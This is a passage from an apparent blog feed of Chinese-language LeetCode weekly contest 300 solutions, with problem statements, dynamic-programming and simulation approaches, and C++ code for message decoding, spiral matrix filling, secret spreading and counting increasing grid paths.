class="line">                        <span class="keyword">if</span> (j == m) <span class="keyword">continue</span>;</span><br><span class="line">                        <span class="keyword">if</span> (__gcd(k, m) &gt; <span class="number">1</span> || k == m) <span class="keyword">continue</span>;</span><br><span class="line">                        dp[i][j][k] = (dp[i][j][k] + dp[i<span class="number">-1</span>][k][m]) % mod;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> tot = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">6</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= <span class="number">6</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (__gcd(i,j) == <span class="number">1</span> &amp;&amp; i != j) &#123;</span><br><span class="line">                    tot = (tot + dp[n][i][j]) % mod;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> tot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode  contest 300</title>
    <url>/2022/11/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/13/</url>
    <content><![CDATA[<h2 id="leetcode-contest-300"><a href="#leetcode-contest-300" class="headerlink" title="leetcode  contest 300"></a>leetcode  contest 300</h2><p>题目质量还不错，第三题经典的动态规划，第四题感觉过于简单了。</p>
<h3 id="6108-解密消息"><a href="#6108-解密消息" class="headerlink" title="6108. 解密消息"></a>6108. 解密消息</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你字符串 <code>key</code> 和 <code>message</code> ，分别表示一个加密密钥和一段加密消息。解密 <code>message</code> 的步骤如下：</p>
<p>使用 <code>key</code> 中 <code>26</code> 个英文小写字母第一次出现的顺序作为替换表中的字母 顺序 。<br>将替换表与普通英文字母表对齐，形成对照表。<br>按照对照表 替换 <code>message</code> 中的每个字母。<br>空格 ‘ ‘ 保持不变。<br>例如，<code>key = &quot;happy boy&quot;</code>（实际的加密密钥会包含字母表中每个字母 至少一次），据此，可以得到部分对照表<code>（&#39;h&#39; -&gt; &#39;a&#39;、&#39;a&#39; -&gt; &#39;b&#39;、&#39;p&#39; -&gt; &#39;c&#39;、&#39;y&#39; -&gt; &#39;d&#39;、&#39;b&#39; -&gt; &#39;e&#39;、&#39;o&#39; -&gt; &#39;f&#39;）</code>。<br>返回解密后的消息。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：key = &quot;the quick brown fox jumps over the lazy dog&quot;, message = &quot;vkbs bs t suepuv&quot;</span><br><span class="line">输出：&quot;this is a secret&quot;</span><br><span class="line">解释：对照表如上图所示。</span><br><span class="line">提取 &quot;the quick brown fox jumps over the lazy dog&quot; 中每个字母的首次出现可以得到替换表。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：key = &quot;eljuxhpwnyrdgtqkviszcfmabo&quot;, message = &quot;zwx hnfx lqantp mnoeius ycgk vcnjrdb&quot;</span><br><span class="line">输出：&quot;the five boxing wizards jump quickly&quot;</span><br><span class="line">解释：对照表如上图所示。</span><br><span class="line">提取 &quot;eljuxhpwnyrdgtqkviszcfmabo&quot; 中每个字母的首次出现可以得到替换表。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>26 &lt;= key.length &lt;= 2000</code></li>
<li><code>key</code> 由小写英文字母及 ‘ ‘ 组成</li>
<li><code>key</code> 包含英文字母表中每个字符（<code>&#39;a&#39;</code> 到 <code>&#39;z&#39;</code>）至少一次</li>
<li><code>1 &lt;= message.length &lt;= 2000</code></li>
<li><code>message</code> 由小写英文字母和 ‘ ‘ 组成</li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-300/problems/decode-the-message/">https://leetcode.cn/contest/weekly-contest-300/problems/decode-the-message/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>按照题意首先将<code>key</code>中的字典序隐射表，然后将<code>message</code> 中的每个字符映射回来即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n + m))$, 其中 $n$ 为字符串 <code>key</code> 的长度， <code>m</code> 为字符串 <code>message</code> 的长度。</li>
<li>空间复杂度：$O(|\Sigma|)$，字符集的大小为 $26$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">decodeMessage</span><span class="params">(string key, string message)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">char</span>&gt; <span class="title">dict</span><span class="params">(<span class="number">26</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; key.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">islower</span>(key[i])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (dict[key[i] - <span class="string">&#x27;a&#x27;</span>] &gt; <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">                dict[key[i] - <span class="string">&#x27;a&#x27;</span>] = j + <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        string res;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; message.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">islower</span>(message[i])) &#123;</span><br><span class="line">                res.<span class="built_in">push_back</span>(dict[message[i] - <span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                res.<span class="built_in">push_back</span>(message[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6111-螺旋矩阵-IV"><a href="#6111-螺旋矩阵-IV" class="headerlink" title="6111. 螺旋矩阵 IV"></a>6111. 螺旋矩阵 IV</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你两个整数：<code>m</code> 和 <code>n</code> ，表示矩阵的维数。</p>
<p>另给你一个整数链表的头节点 <code>head</code> 。</p>
<p>请你生成一个大小为 <code>m x n</code> 的螺旋矩阵，矩阵包含链表中的所有整数。链表中的整数从矩阵 左上角 开始、顺时针 按 螺旋 顺序填充。如果还存在剩余的空格，则用 <code>-1</code> 填充。</p>
<p>返回生成的矩阵。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：m = 3, n = 5, head = [3,0,2,6,8,1,7,9,4,2,5,5,0]</span><br><span class="line">输出：[[3,0,2,6,8],[5,0,-1,-1,1],[5,2,4,9,7]]</span><br><span class="line">解释：上图展示了链表中的整数在矩阵中是如何排布的。</span><br><span class="line">注意，矩阵中剩下的空格用 -1 填充。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：m = 1, n = 4, head = [0,1,2]</span><br><span class="line">输出：[[0,1,2,-1]]</span><br><span class="line">解释：上图展示了链表中的整数在矩阵中是如何从左到右排布的。 </span><br><span class="line">注意，矩阵中剩下的空格用 -1 填充。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= m, n &lt;= 105</code></li>
<li><code>1 &lt;= m * n &lt;= 105</code></li>
<li>链表中节点数目在范围 <code>[1, m * n]</code> 内</li>
<li><code>0 &lt;= Node.val &lt;= 1000</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-299/problems/count-number-of-ways-to-place-houses/">https://leetcode.cn/contest/weekly-contest-299/problems/count-number-of-ways-to-place-houses/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>矩阵层次遍历问题
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>经典的矩阵按照层次遍历问题，可以参考「<a href="https://leetcode.cn/problems/spiral-matrix/">54. 螺旋矩阵</a>」相关解法，我们将数组中的值依次按照矩阵的层次遍历，将链表中的每一项按照顺序填写进去即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(m \times n)$，其中 $m,n$ 为矩阵的行数与列数。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">spiralMatrix</span>(<span class="type">int</span> m, <span class="type">int</span> n, ListNode* head) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">matrix</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, <span class="number">-1</span>));</span><br><span class="line">        <span class="type">int</span> rows = m, columns = n;</span><br><span class="line">        <span class="type">int</span> left = <span class="number">0</span>, right = columns - <span class="number">1</span>, top = <span class="number">0</span>, bottom = rows - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt;= right &amp;&amp; top &lt;= bottom &amp;&amp; head) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> column = left; column &lt;= right &amp;&amp; head; column++) &#123;</span><br><span class="line">                matrix[top][column] = head-&gt;val;</span><br><span class="line">                head = head-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> row = top + <span class="number">1</span>; row &lt;= bottom &amp;&amp; head; row++) &#123;</span><br><span class="line">                matrix[row][right] = head-&gt;val;</span><br><span class="line">                head = head-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (left &lt; right &amp;&amp; top &lt; bottom) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> column = right - <span class="number">1</span>; column &gt; left &amp;&amp; head; column--) &#123;</span><br><span class="line">                    matrix[bottom][column] = head-&gt;val;</span><br><span class="line">                    head = head-&gt;next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> row = bottom; row &gt; top &amp;&amp; head; row--) &#123;</span><br><span class="line">                    matrix[row][left] = head-&gt;val;</span><br><span class="line">                    head = head-&gt;next;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            left++;</span><br><span class="line">            right--;</span><br><span class="line">            top++;</span><br><span class="line">            bottom--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> matrix;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6109-知道秘密的人数"><a href="#6109-知道秘密的人数" class="headerlink" title="6109. 知道秘密的人数"></a>6109. 知道秘密的人数</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>在第 <code>1</code> 天，有一个人发现了一个秘密。</p>
<p>给你一个整数 <code>delay</code> ，表示每个人会在发现秘密后的 <code>delay</code> 天之后，每天 给一个新的人 分享 秘密。同时给你一个整数 <code>forget</code> ，表示每个人在发现秘密 <code>forget</code> 天之后会 忘记 这个秘密。一个人 不能 在忘记秘密那一天及之后的日子里分享秘密。</p>
<p>给你一个整数 <code>n</code> ，请你返回在第 <code>n</code> 天结束时，知道秘密的人数。由于答案可能会很大，请你将结果对 <code>109 + 7</code> 取余 后返回。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 6, delay = 2, forget = 4</span><br><span class="line">输出：5</span><br><span class="line">解释：</span><br><span class="line">第 1 天：假设第一个人叫 A 。（一个人知道秘密）</span><br><span class="line">第 2 天：A 是唯一一个知道秘密的人。（一个人知道秘密）</span><br><span class="line">第 3 天：A 把秘密分享给 B 。（两个人知道秘密）</span><br><span class="line">第 4 天：A 把秘密分享给一个新的人 C 。（三个人知道秘密）</span><br><span class="line">第 5 天：A 忘记了秘密，B 把秘密分享给一个新的人 D 。（三个人知道秘密）</span><br><span class="line">第 6 天：B 把秘密分享给 E，C 把秘密分享给 F 。（五个人知道秘密）</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 4, delay = 1, forget = 3</span><br><span class="line">输出：6</span><br><span class="line">解释：</span><br><span class="line">第 1 天：第一个知道秘密的人为 A 。（一个人知道秘密）</span><br><span class="line">第 2 天：A 把秘密分享给 B 。（两个人知道秘密）</span><br><span class="line">第 3 天：A 和 B 把秘密分享给 2 个新的人 C 和 D 。（四个人知道秘密）</span><br><span class="line">第 4 天：A 忘记了秘密，B、C、D 分别分享给 3 个新的人。（六个人知道秘密）</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>2 &lt;= n &lt;= 1000</code></li>
<li><code>1 &lt;= delay &lt; forget &lt;= n</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/number-of-people-aware-of-a-secret/">https://leetcode.cn/problems/number-of-people-aware-of-a-secret/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>动态规划
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>这个题目的动态规划比较有意思的，还是稍微不好思考，有多种解法可以满足要求，有多种解法：</li>
</ol>
<ul>
<li>解法一: 设 $dp[i]$ 标识第 $i$ 天新增的人数，此时我们可以知道第 $i$ 天新增的数目为 $dp[i] &#x3D; \sum_{j&#x3D;i-forget+1}^{i-delay}dp[j]$，第 $i$ 天的总人数为 $\sum_{i&#x3D;n-forget+1}^{n}dp[i]$。用前缀和的解法，可以优化到 $O(n)$ 的时间复杂度。</li>
<li>解法二: 设 $dp[i][j]$ 标识当前第 $i$ 天时已经知道消息时长为 $j$ 的人数。此时我们可以知道如下推理：<br>$$<br>dp[i][j] &#x3D; dp[i-1][j-1] \<br>dp[i][0] &#x3D; \sum_{k&#x3D;delay}^{forget} dp[i][k]<br>$$<br>第 $i-1$ 天且发现秘密为 $j$ 天的为 $dp[i-1][j]$, 当经过一天之后，总共有 $dp[i-1][j]$ 个人发现秘密的时间变为 $j+1$ 天，此时 $dp[i][j+1] &#x3D; dp[i-1][j$，同时新的传播且发现秘密的人数需要统计所有大于等 $delay$ 的天数即可，此时 $dp[i][0] &#x3D; \sum_{j&#x3D;delay-1}^{forget-2}dp[i-1][j]$。</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n^2)$, $n$ 表示给定的天数，可以优化到 $O(n)$ 的时间复杂度。</li>
<li>空间复杂度：$O(n)$，$n$ 表示给定的天数。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><ul>
<li>解法一:<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">peopleAwareOfSecret</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> delay, <span class="type">int</span> forget)</span> </span>&#123;        </span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">sum</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        sum[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> start = <span class="built_in">max</span>(<span class="number">0</span>, i - forget);</span><br><span class="line">            <span class="type">int</span> end = <span class="built_in">max</span>(<span class="number">0</span>, i - delay);</span><br><span class="line">            dp[i] = (sum[end] - sum[start] + mod) % mod;</span><br><span class="line">            sum[i] = sum[i - <span class="number">1</span>] + dp[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (sum[n] - sum[<span class="built_in">max</span>(<span class="number">0</span>, n - forget)] + mod) % mod;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>解法二:<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">peopleAwareOfSecret</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> delay, <span class="type">int</span> forget)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">dp</span><span class="params">(forget)</span></span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = forget - <span class="number">1</span>; j &gt;= <span class="number">1</span>; j--) &#123;</span><br><span class="line">                dp[j] = dp[j - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = delay; j &lt; forget; j++) &#123;</span><br><span class="line">                dp[<span class="number">0</span>] = (dp[<span class="number">0</span>] + dp[j]) % mod;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; forget; i++) &#123;</span><br><span class="line">            ans = (ans + dp[i]) % mod;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="6110-网格图中递增路径的数目"><a href="#6110-网格图中递增路径的数目" class="headerlink" title="6110. 网格图中递增路径的数目"></a>6110. 网格图中递增路径的数目</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你一个 <code>m x n</code> 的整数网格图 <code>grid</code> ，你可以从一个格子移动到 <code>4</code> 个方向相邻的任意一个格子。</p>
<p>请你返回在网格图中从 任意 格子出发，达到 任意 格子，且路径中的数字是 严格递增 的路径数目。由于答案可能会很大，请将结果对 <code>109 + 7</code> 取余 后返回。</p>
<p>如果两条路径中访问过的格子不是完全相同的，那么它们视为两条不同的路径。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grid = [[1,1],[3,4]]</span><br><span class="line">输出：8</span><br><span class="line">解释：严格递增路径包括：</span><br><span class="line">- 长度为 1 的路径：[1]，[1]，[3]，[4] 。</span><br><span class="line">- 长度为 2 的路径：[1 -&gt; 3]，[1 -&gt; 4]，[3 -&gt; 4] 。</span><br><span class="line">- 长度为 3 的路径：[1 -&gt; 3 -&gt; 4] 。</span><br><span class="line">路径数目为 4 + 3 + 1 = 8 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grid = [[1],[2]]</span><br><span class="line">输出：3</span><br><span class="line">解释：严格递增路径包括：</span><br><span class="line">- 长度为 1 的路径：[1]，[2] 。</span><br><span class="line">- 长度为 2 的路径：[1 -&gt; 2] 。</span><br><span class="line">路径数目为 2 + 1 = 3 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>m == grid.length</code></li>
<li><code>n == grid[i].length</code></li>
<li><code>1 &lt;= m, n &lt;= 1000</code></li>
<li><code>1 &lt;= m * n &lt;= 105</code></li>
<li><code>1 &lt;= grid[i][j] &lt;= 105</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-300/problems/number-of-increasing-paths-in-a-grid/">https://leetcode.cn/contest/weekly-contest-300/problems/number-of-increasing-paths-in-a-grid/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>动态规划
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>非常简单的动态规划，题目要求严格递增，首先我们想到的就是将矩阵中的数字按照大小进行排列，设 $dp[i][j]$ 表示 以 $(i,j)$ 为结尾且严格递增的路径数目，此时我们可以知道如下递推关系:<br>$$<br>dp[i][j] &#x3D; (dp[i][j] + dp[i][j-1]) \quad if(grid[i][j] &gt; grid[i][j-1])\<br>dp[i][j] &#x3D; (dp[i][j] + dp[i-1][j]) \quad if(grid[i][j] &gt; grid[i-1][j])\<br>dp[i][j] &#x3D; (dp[i][j] + dp[i][j+1]) \quad if(grid[i][j] &gt; grid[i][j+1])\<br>dp[i][j] &#x3D; (dp[i][j] + dp[i+1][j]) \quad if(grid[i][j] &gt; grid[i+1][j])\<br>$$<br>由于满足了严格的大小关系，所以所有严格小于 $dp[i][j]$ 的序列数目已经确定。 </li>
<li>只需要满足严格递增即可，感觉就非常简单了，不过可以稍微修改一点增加难度，比如非严格递增怎么解决？</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$m \times n$， $m, n$ 表示矩阵的行数与列数。</li>
<li>空间复杂度：$m \times n$,  $m, n$ 表示矩阵的行数与列数。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countPaths</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        vector&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt; arr;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                arr.<span class="built_in">emplace_back</span>(grid[i][j], i * n + j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(arr.<span class="built_in">begin</span>(), arr.<span class="built_in">end</span>(), [&amp;](<span class="type">const</span> pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; a, <span class="type">const</span> pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; &amp;b) &#123;</span><br><span class="line">            <span class="keyword">return</span> a.first &lt; b.first;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="type">int</span> tot = m * n;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">dp</span>(m, <span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(n, <span class="number">1</span>));</span><br><span class="line">        <span class="type">int</span> dir[<span class="number">4</span>][<span class="number">2</span>] = &#123;&#123;<span class="number">0</span>, <span class="number">-1</span>&#125;, &#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">-1</span>, <span class="number">0</span>&#125;&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m * n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> cx = arr[i].second / n;</span><br><span class="line">            <span class="type">int</span> cy = arr[i].second % n;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">                <span class="type">int</span> nx = cx + dir[j][<span class="number">0</span>];</span><br><span class="line">                <span class="type">int</span> ny = cy + dir[j][<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> (nx &gt;= <span class="number">0</span> &amp;&amp; nx &lt; m &amp;&amp; ny &gt;= <span class="number">0</span> &amp;&amp; ny &lt; n) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (grid[cx][cy] &gt; grid[nx][ny]) &#123;</span><br><span class="line">                        dp[cx][cy] = (dp[cx][cy] + dp[nx][ny]) % mod;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                ans = (ans + dp[i][j]) % mod;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>2022 年度杭州未来科技城数字经济人才编程大赛</title>
    <url>/2022/11/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/14/</url>
    <content><![CDATA[<h2 id="2022-年度杭州未来科技城数字经济人才编程大赛"><a href="#2022-年度杭州未来科技城数字经济人才编程大赛" class="headerlink" title="2022 年度杭州未来科技城数字经济人才编程大赛"></a>2022 年度杭州未来科技城数字经济人才编程大赛</h2><p>前三题基本上常规题目，感觉最后一题确实有一点思路比较难想到，还是卡在了关键的一点上。</p>
<h3 id="zj-future01-信号接收"><a href="#zj-future01-信号接收" class="headerlink" title="zj-future01. 信号接收"></a>zj-future01. 信号接收</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>假设有若干信号发射源定时发送信号， <code>signals[i] = [start, end)</code> 表示第 <code>i</code> 个信号发射源运作的开始时间 <code>start</code> 和停止时间 <code>end</code> 。</p>
<p>若调度员的接收设备同一时刻仅能接收一个发射源发出的信号，请判断调度员能否收到所有发射源的完整信号。</p>
